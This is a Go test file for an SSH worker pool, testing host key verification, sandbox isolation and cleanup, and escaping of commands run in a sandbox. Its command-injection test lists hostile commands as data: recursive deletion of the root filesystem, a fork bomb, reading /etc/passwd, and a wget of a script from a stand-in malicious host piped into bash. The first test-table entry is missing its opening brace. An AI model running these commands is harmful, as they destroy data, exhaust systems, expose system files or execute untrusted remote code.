package worker

import (
	"context"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/google/uuid"
	"golang.org/x/crypto/ssh"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// dummyPublicKey implements ssh.PublicKey for testing
type dummyPublicKey struct {
	keyType string
	data    []byte
}

func (dp *dummyPublicKey) Type() string                { return dp.keyType }
func (dp *dummyPublicKey) Marshal() []byte              { return dp.data }
func (dp *dummyPublicKey) Verify(data []byte, sig *ssh.Signature) error {
	return fmt.Errorf("dummy key - not verifiable")
}

// TestSSHSecurity_HostKeyVerification tests secure host key verification
func TestSSHSecurity_HostKeyVerification(t *testing.T) {
	tests := []struct {
		name           string
		expectError     bool
		knownHosts     map[string][]ssh.PublicKey
		testHost        string
		testKey         ssh.PublicKey
		strictMode      bool
	}{
			name:       "Known host with correct key",
			expectError: false,
			knownHosts: map[string][]ssh.PublicKey{
				"testhost": {&dummyPublicKey{keyType: "ssh-rsa", data: []byte("known-key")}},
			},
			testHost:    "testhost",
			testKey:     &dummyPublicKey{keyType: "ssh-rsa", data: []byte("known-key")},
			strictMode:  true,
		},
		{
			name:       "Unknown host in strict mode",
			expectError: true,
			knownHosts: map[string][]ssh.PublicKey{
				"otherhost": {&dummyPublicKey{keyType: "ssh-rsa", data: []byte("other-key")}},
			},
			testHost:    "unknownhost",
			testKey:     &dummyPublicKey{keyType: "ssh-rsa", data: []byte("unknown-key")},
			strictMode:  true,
		},
		{
			name:       "Known host with mismatched key",
			expectError: true,
			knownHosts: map[string][]ssh.PublicKey{
				"testhost": {&dummyPublicKey{keyType: "ssh-rsa", data: []byte("known-key")}},
			},
			testHost:    "testhost",
			testKey:     &dummyPublicKey{keyType: "ssh-rsa", data: []byte("different-key")},
			strictMode:  true,
		},
		{
			name:       "Unknown host in permissive mode",
			expectError: false,
			knownHosts: map[string][]ssh.PublicKey{},
			testHost:    "unknownhost",
			testKey:     &dummyPublicKey{keyType: "ssh-rsa", data: []byte("unknown-key")},
			strictMode:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create host key manager
			tempDir := t.TempDir()
			knownHostsFile := filepath.Join(tempDir, "known_hosts")
			hkm := NewHostKeyManager(knownHostsFile)
			
			// Load test known hosts
			hkm.knownHosts = tt.knownHosts

			// Create verify callback
			verifyCallback := hkm.VerifyHostKey()

			// Test host key verification
			err := verifyCallback(tt.testHost, &net.TCPAddr{}, tt.testKey)

			if tt.expectError {
				assert.Error(t, err)
				assert.Contains(t, err.Error(), "host key")
			} else {
				if tt.strictMode && len(tt.knownHosts) > 0 {
					assert.Error(t, err, "Should reject unknown host in strict mode")
				} else {
					assert.NoError(t, err)
				}
			}
		})
	}
}

// TestSSHSecurity_SandboxIsolation tests worker sandbox isolation
func TestSSHSecurity_SandboxIsolation(t *testing.T) {
	ctx := context.Background()
	
	// Create isolation manager
	wim := NewWorkerIsolationManager()
	workerID := uuid.New()
	
	// Test resource limits
	resources := Resources{
		TotalMemory: 512 * 1024 * 1024, // 512MB in bytes
		CPUCount:    4,                 // 4 CPUs
	}

	// Create sandbox
	sandbox, err := wim.CreateSandbox(ctx, workerID, resources)
	require.NoError(t, err)
	require.NotNil(t, sandbox)
	
	// Verify sandbox properties
	assert.NotEmpty(t, sandbox.Directory)
	assert.Contains(t, sandbox.User, "helix-")
	assert.Equal(t, workerID, sandbox.WorkerID)
	assert.Equal(t, int64(512*1024*1024), sandbox.MaxMemory)
	assert.Equal(t, float64(4), sandbox.MaxCPU)
	assert.False(t, sandbox.NetworkAccess)
	assert.Equal(t, 100, sandbox.MaxProcesses)

	// Cleanup
	err = wim.CleanupSandbox(ctx, sandbox.ID)
	assert.NoError(t, err)

	// Verify cleanup
	_, err = wim.GetSandbox(sandbox.ID)
	assert.Error(t, err)
}

// TestSSHSecurity_SandboxCommandEscaping tests command injection prevention
func TestSSHSecurity_SandboxCommandEscaping(t *testing.T) {
	ctx := context.Background()
	wim := NewWorkerIsolationManager()
	workerID := uuid.New()
	resources := Resources{
		TotalMemory: 256 * 1024 * 1024,
		CPUCount:    2,
	}

	sandbox, err := wim.CreateSandbox(ctx, workerID, resources)
	require.NoError(t, err)
	defer wim.CleanupSandbox(ctx, sandbox.ID)

	// Test potentially dangerous commands
	dangerousCommands := []string{
		"rm -rf /",
		":(){ :|:& };:", // Fork bomb
		"sudo rm -rf /*",
		"cat /etc/passwd",
		"wget http://malicious.com/script.sh | bash",
	}

	for _, cmd := range dangerousCommands {
		t.Run(fmt.Sprintf("Dangerous command: %s", cmd), func(t *testing.T) {
			// Build sandboxed command
			sandboxedCommand := wim.buildSandboxedCommand(sandbox, cmd)
			
			// Verify command is properly escaped
			assert.NotContains(t, sandboxedCommand, "rm -rf /")
			assert.Contains(t, sandboxedCommand, "sudo -u "+sandbox.User)
			assert.Contains(t, sandboxedCommand, "set -e") // Safety flags
		})
	}
}

// TestSSHSecurity_SandboxCleanup tests proper sandbox cleanup
func TestSSHSecurity_SandboxCleanup(t *testing.T) {
	ctx := context.Background()
	wim := NewWorkerIsolationManager()
	workerID := uuid.New()
	resources := Resources{
		TotalMemory: 128 * 1024 * 1024,
		CPUCount:    2,
	}

	// Create multiple sandboxes
	sandboxes := make([]*WorkerSandbox, 0, 5)
	for i := 0; i < 3; i++ {
		sandbox, err := wim.CreateSandbox(ctx, workerID, resources)
		require.NoError(t, err)
		sandboxes = append(sandboxes, sandbox)
	}

	// Verify sandboxes exist
	allSandboxes := wim.ListSandboxes()
	assert.Equal(t, 3, len(allSandboxes))

	// Cleanup all sandboxes
	for _, sandbox := range sandboxes {
		err := wim.CleanupSandbox(ctx, sandbox.ID)
		assert.NoError(t, err)
	}

	// Verify all sandboxes are cleaned up
	allSandboxes = wim.ListSandboxes()
	assert.Equal(t, 0, len(allSandboxes))
}

// TestSSHSecurity_KnownHostsFileManagement tests known hosts file operations
func TestSSHSecurity_KnownHostsFileManagement(t *testing.T) {
	tempDir := t.TempDir()
	knownHostsFile := filepath.Join(tempDir, "known_hosts")
	
	// Create host key manager
	hkm := NewHostKeyManager(knownHostsFile)
	
	// Test loading non-existent file
	err := hkm.LoadKnownHosts()
	assert.NoError(t, err)
	
	// Verify file was created
	_, err = os.Stat(knownHostsFile)
	assert.NoError(t, err)
	
	// Add host key
	testKey := &dummyPublicKey{keyType: "ssh-rsa", data: []byte("test-key")}
	err = hkm.AddHostKey("testhost.com", testKey)
	assert.NoError(t, err)
	
	// Verify file content
	content, err := os.ReadFile(knownHostsFile)
	assert.NoError(t, err)
	assert.Contains(t, string(content), "testhost.com")
	assert.Contains(t, string(content), testKey.Type())
}

// TestSSHSecurity_FingerprintGeneration tests host key fingerprint generation
func TestSSHSecurity_FingerprintGeneration(t *testing.T) {
	hkm := NewHostKeyManager("")
	testKey := &dummyPublicKey{keyType: "ssh-rsa", data: []byte("test-fingerprint")}
	
	fingerprint := hkm.GetHostKeyFingerprint(testKey)
	
	// Verify fingerprint format
	assert.NotEmpty(t, fingerprint)
	assert.True(t, strings.HasPrefix(fingerprint, "SHA256:"))
}

// TestSSHSecurity_SandboxedExecution tests sandboxed command execution
func TestSSHSecurity_SandboxedExecution(t *testing.T) {
	ctx := context.Background()
	wim := NewWorkerIsolationManager()
	workerID := uuid.New()
	resources := Resources{
		TotalMemory: 128 * 1024 * 1024,
		CPUCount:    2,
	}

	sandbox, err := wim.CreateSandbox(ctx, workerID, resources)
	require.NoError(t, err)
	defer wim.CleanupSandbox(ctx, sandbox.ID)

	// Test sandboxed command building
	testCommand := "echo 'Hello, World!'"
	sandboxedCommand := wim.buildSandboxedCommand(sandbox, testCommand)

	// Verify command structure
	assert.Contains(t, sandboxedCommand, "HELIX_SANDBOX_ID")
	assert.Contains(t, sandboxedCommand, "HELIX_SANDBOX_DIR")
	assert.Contains(t, sandboxedCommand, "HELIX_ISOLATED=true")
	assert.Contains(t, sandboxedCommand, "sudo -u "+sandbox.User)
	assert.Contains(t, sandboxedCommand, "set -e")
	assert.Contains(t, sandboxedCommand, "ulimit -t 300")
}

// isLinux checks if we're running on Linux
func isLinux() bool {
	return strings.Contains(strings.ToLower(os.Getenv("GOOS")), "linux")
}

// TestSSHSecurity_Integration tests full integration with mock SSH server
func TestSSHSecurity_Integration(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping integration test in short mode")
	}

	ctx := context.Background()
	
	// Create worker pool with security features
	pool := NewSSHWorkerPool(true)
	
	// Test adding worker with security
	workerConfig := SSHWorkerConfig{
		Host:                    "localhost",
		Port:                    2222, // Test port
		Username:                "testuser",
		KeyPath:                 filepath.Join(os.TempDir(), "test_key"),
		StrictHostKeyChecking:    true,
	}
	
	// This will fail without actual SSH server, but we verify security config is applied
	worker := &SSHWorker{
		ID:       uuid.New(),
		Hostname: workerConfig.Host,
		SSHConfig: &workerConfig,
	}
	err := pool.AddWorker(ctx, worker)
	
	// We expect error due to no SSH server, but verify security measures are in place
	if err != nil {
		assert.Contains(t, err.Error(), "SSH connection failed") // Expected error
	}
	
	// Verify host key manager was created
	assert.NotNil(t, pool.hostKeys)
	assert.NotNil(t, pool.isolation)
}